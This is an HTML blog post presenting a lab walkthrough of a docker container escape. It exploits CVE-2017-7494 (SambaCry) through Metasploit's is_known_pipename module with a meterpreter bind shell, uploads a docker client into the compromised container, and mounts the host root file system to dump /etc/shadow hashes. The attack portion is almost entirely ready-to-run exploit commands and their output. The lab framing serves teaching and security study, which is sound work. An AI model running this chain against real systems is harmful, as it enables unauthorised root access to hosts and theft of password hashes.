<!doctype html><html lang=en>
<head><title>Abusing insecure docker deployments &ndash; STRM</title>
<meta name=description content="A pro-freedom hacktivist thinktank.
">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://strm.sh/css/colour/strm-dark.css>
<link rel=stylesheet href=https://strm.sh/css/colour/dark-mode.css>
<link rel=stylesheet href=https://strm.sh/css/main.css>
<link rel=stylesheet href=https://strm.sh/css/custom.css>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://strm.sh class=page__logo-inner>STRM</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=/posts/ title>Posts</a></li>
<li class=main-nav__item><a class=nav-main-item href=/projects/ title>Projects</a></li>
<li class=main-nav__item><a class=nav-main-item href=/malware-samples/ title>Malware</a></li>
<li class=main-nav__item><a class=nav-main-item href=/studies/ title>Studies</a></li>
<li class=main-nav__item><a class=nav-main-item href=https://github.com/opsxcq/blog/discussions/3>Forum</a></li>
</ul>
</nav>
</header>
<section class=page__body>
<header class=content__header>
<h1>Abusing insecure docker deployments</h1>
</header>
<div class=content__body>
<p>Is possible to abuse misconfigurations and bugs and escape from containers in
several scenarios, in this post I will explore the most basic one: abusing the
docker socket to escape the container and run code as <strong>root</strong> in the host machine.</p>
<h2 id=lab-setup>Lab setup</h2>
<p>Since we will be using containers, you have to install <a href=https://docker.com>docker</a> to be able to run
this lab.</p>
<h3 id=create-the-network>Create the network</h3>
<p>The very first step is to create a docker network where the containers will be
created:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>docker network create pwnage
</code></pre></div><h3 id=start-the-vulnerable-container>Start the vulnerable container</h3>
<p>For this example, we will use a container vulnerable to <code>CVE-2017-7494</code>, also
known as Samba Cry vulnerability. If you are interested in reading more about it
please check this repository <a href=https://github.com/opsxcq/exploit-CVE-2017-7494>opsxcq/exploit-CVE-2017-7494</a>.</p>
<p>This vulnerability allows you to get remote code execution in a Samba server, to
complete the setup the docker socket will be added to the container. This will
generate a common misconfiguration scenario:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>docker run --rm -it <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       --name vulnerable <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       --network pwnage <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       -v <span style=color:#e6db74>&#39;/var/run/docker.sock:/var/run/docker.sock&#39;</span> <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       vulnerables/cve-2017-7494
</code></pre></div><h3 id=start-the-attacker-environment>Start the attacker environment</h3>
<p>The very last step in our environment is to add the attacker host to the
network. There is an exploit in the Samba Cry repository, but instead we will be
using <code>Metasploit</code> because of <code>meterpreter's</code> advanced features which will make the
whole process easier. There is an image already build for that, just run the
command bellow and everything will run as needed for this lab:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>docker run --rm -it <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       --network pwnage <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       -v <span style=color:#e6db74>&#39;/usr/bin/docker:/docker:ro&#39;</span> <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span>       strm/metasploit
</code></pre></div><p>After it is loaded you will be presented to this screen</p>
<figure><img src=https://raw.githubusercontent.com/opsxcq/docker-metasploit/master/print.png>
</figure>
<h2 id=attack>Attack</h2>
<h3 id=information-gathering>Information gathering</h3>
<p>In any attack, the first thing to do is to gather information about the target.
So let&rsquo;s first check the connectivity by pinging the <code>vulnerable</code> container.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ping -c <span style=color:#ae81ff>2</span> vulnerable
</code></pre></div><p>If everything is OK you should expect an output like</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf5 &gt; ping -c <span style=color:#ae81ff>2</span> vulnerable
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> exec: ping -c <span style=color:#ae81ff>2</span> vulnerable

PING vulnerable <span style=color:#f92672>(</span>172.20.0.2<span style=color:#f92672>)</span> 56<span style=color:#f92672>(</span>84<span style=color:#f92672>)</span> bytes of data.
<span style=color:#ae81ff>64</span> bytes from vulnerable.pwnage <span style=color:#f92672>(</span>172.20.0.2<span style=color:#f92672>)</span>: icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> time<span style=color:#f92672>=</span>0.120 ms
<span style=color:#ae81ff>64</span> bytes from vulnerable.pwnage <span style=color:#f92672>(</span>172.20.0.2<span style=color:#f92672>)</span>: icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> time<span style=color:#f92672>=</span>0.097 ms

--- vulnerable ping statistics ---
<span style=color:#ae81ff>2</span> packets transmitted, <span style=color:#ae81ff>2</span> received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev <span style=color:#f92672>=</span> 0.097/0.108/0.120/0.015 ms
</code></pre></div><p>Then we proceed to a basic smb shares enumeration with:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>use auxiliary/scanner/smb/smb_enumshares
set rhosts vulnerable
run
</code></pre></div><p>The expected output is</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>msf5 &gt; use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set rhosts vulnerable
rhosts =&gt; vulnerable
msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run

[+] 172.20.0.2:139        - data - (DS) Data
[+] 172.20.0.2:139        - IPC$ - (I) IPC Service (Crying samba)
[*] vulnerable:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre></div><p>It show us that there is a share named <code>data</code> in this samba server.</p>
<h2 id=getting-access>Getting access</h2>
<p>Next step is to run the exploit against the host so we can obtain a shell. On
<code>Metasploit</code> this vulnerability is named <code>is_known_pipename</code> and is located in
<code>exploit/linux/samba/is_known_pipename</code>.</p>
<p>Run the command bellow to attack the host:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>use exploit/linux/samba/is_known_pipename
set RHOST vulnerable
set RPORT <span style=color:#ae81ff>445</span>
set payload linux/x64/meterpreter/bind_tcp
set TARGET <span style=color:#ae81ff>3</span>
set SMB_FOLDER data
set SMBUser sambacry
set SMBPass nosambanocry
exploit
</code></pre></div><p>If everything runs fine, you should be presented with a <code>meterpreter</code> shell like:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>msf5 &gt; use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) &gt; set RHOST vulnerable
RHOST =&gt; vulnerable
msf5 exploit(linux/samba/is_known_pipename) &gt; set RPORT 445
RPORT =&gt; 445
msf5 exploit(linux/samba/is_known_pipename) &gt; set payload linux/x64/meterpreter/bind_tcp
payload =&gt; linux/x64/meterpreter/bind_tcp
msf5 exploit(linux/samba/is_known_pipename) &gt; set TARGET 3
TARGET =&gt; 3
msf5 exploit(linux/samba/is_known_pipename) &gt; set SMB_FOLDER data
SMB_FOLDER =&gt; data
msf5 exploit(linux/samba/is_known_pipename) &gt; set SMBUser sambacry
SMBUser =&gt; sambacry
msf5 exploit(linux/samba/is_known_pipename) &gt; set SMBPass nosambanocry
SMBPass =&gt; nosambanocry
msf5 exploit(linux/samba/is_known_pipename) &gt; exploit

[*] vulnerable:445 - Using location \\vulnerable\data\ for the path
[*] vulnerable:445 - Retrieving the remote path of the share &#39;data&#39;
[*] vulnerable:445 - Share &#39;data&#39; has server-side path &#39;/data
[*] vulnerable:445 - Uploaded payload to \\vulnerable\data\shyyEPPk.so
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using \\PIPE\/data/shyyEPPk.so...
[-] vulnerable:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using /data/shyyEPPk.so...
[-] vulnerable:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] Started bind TCP handler against vulnerable:4444
[*] Sending stage (816260 bytes) to vulnerable

meterpreter &gt;
</code></pre></div><h2 id=escalating-privileges>Escalating privileges</h2>
<p>To escalate privileges we will abuse the docker socket being available inside
the container. Since <code>dockerd</code> runs as root in the host machine, it has root
permissions so we can abuse it to do several things. For example using
<code>--privileged</code> can give you several extended capabilities, the text bellow
explaining them was extracted from the official docker documentation:</p>
<blockquote>
<p>By default, Docker containers are “unprivileged” and cannot, for example, run a
Docker daemon inside a Docker container. This is because by default a container
is not allowed to access any devices, but a “privileged” container is given
access to all devices (see the documentation on cgroups devices). When the
operator executes docker run &ndash;privileged, Docker will enable access to all
devices on the host as well as set some configuration in AppArmor or SELinux to
allow the container nearly all the same access to the host as processes running
outside containers on the host.</p>
</blockquote>
<p>You can access devices with <code>--device</code>, but in our case, we will map the root file
system (<code>/</code>) to the container and have access to it.</p>
<p>Since there is no docker client inside this container, the next step is to setup
the docker client and its dependencies inside our target container. Just run the
command bellow and everything will be done.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>upload /docker /docker
upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
chmod <span style=color:#ae81ff>777</span> /docker
chmod +x /docker
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>meterpreter &gt; upload /docker /docker
[*] uploading  : /docker -&gt; /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -&gt; /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -&gt; /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -&gt; /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -&gt; /docker
[*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -&gt; /docker
[*] uploaded   : /docker -&gt; /docker
meterpreter &gt; upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploading  : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] Uploaded -1.00 B of 38.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
[*] uploaded   : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
meterpreter &gt; chmod 777 /docker
meterpreter &gt; chmod +x /docker
meterpreter &gt;
</code></pre></div><p>And finally, using docker to have access to the host file system.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>execute -f /docker -i -H -c -a <span style=color:#e6db74>&#34;run --rm -v &#39;/:/rootfs&#39; debian:9.2 cat /rootfs/etc/shadow&#34;</span>
</code></pre></div><p>And that is it, you&rsquo;ve escaped the container and dumped the machine local user
hashes, the output will look like:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>meterpreter &gt; execute -f /docker -i -H -c -a &#34;run --rm -v &#39;/:/rootfs&#39; debian:9.2 cat /rootfs/etc/shadow&#34;
Process 113 created.
Channel 13 created.
root:$1$UFKdtFGw$qp29y1qGWit/vnvIG0uSr1:17488:0:99999:7:::
daemon:*:17488:0:99999:7:::
bin:*:17488:0:99999:7:::
sys:*:17488:0:99999:7:::
sync:*:17488:0:99999:7:::
games:*:17488:0:99999:7:::
man:*:17488:0:99999:7:::
lp:*:17488:0:99999:7:::
mail:*:17488:0:99999:7:::
news:*:17488:0:99999:7:::
</code></pre></div><h2 id=references>References</h2>
<ul>
<li><a href=https://github.com/opsxcq/docker-metasploit>Metasploit docker image</a></li>
<li><a href=https://github.com/opsxcq/exploit-CVE-2017-7494>Vulnerable container</a></li>
</ul>
</div>
<footer class=content__footer></footer>
<script src=https://utteranc.es/client.js repo=opsxcq/blog issue-term=title label=comment theme=dark-blue crossorigin=anonymous async></script>
</section>
<section class=page__aside>
<div class=aside__about>
<div class=aside__about>
<h1 class=about__title>## STRM ##</h1>
<p class=about__description>A pro-freedom hacktivist thinktank.</p>
</div>
<ul class=aside__social-links>
<li>
<a href=https://github.com/opsxcq/blog rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:trash-can@strm.sh rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://keybase.io/terminator rel=me aria-label="Keybase OPSXCQ" title="Keybase OPSXCQ"><i class="fab fa-keybase" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://keybase.io/team/cryptoanarquismo rel=me aria-label="Keybase Crypto" title="Keybase Crypto"><i class="fas fa-users" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://keybase.io/team/deepweb rel=me aria-label="Keybase Deep Web" title="Keybase Deep Web"><i class="fas fa-users" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://github.com/opsxcq/blog/discussions/3 rel=me aria-label=Forum title=Forum><i class="fas fa-users" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=https://gitter.im/strm-blog/community rel=me aria-label=Gitter title=Gitter><i class="fab fa-gitter" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</div>
<hr>
<div class=aside__content>
<p>
By [OPSXCQ],
2018-11-10
</p>
<nav id=TableOfContents>
<ul>
<li><a href=#lab-setup>Lab setup</a>
<ul>
<li><a href=#create-the-network>Create the network</a></li>
<li><a href=#start-the-vulnerable-container>Start the vulnerable container</a></li>
<li><a href=#start-the-attacker-environment>Start the attacker environment</a></li>
</ul>
</li>
<li><a href=#attack>Attack</a>
<ul>
<li><a href=#information-gathering>Information gathering</a></li>
</ul>
</li>
<li><a href=#getting-access>Getting access</a></li>
<li><a href=#escalating-privileges>Escalating privileges</a></li>
<li><a href=#references>References</a></li>
</ul>
</nav>
</div>
</section>
<footer class=page__footer><p class=copyright>STRM</p>
<p class=advertisement>Powered by <a href=https://github.com/opsxcq/blog>Open Source</a></p>
</footer>
</div>
</body>
</html>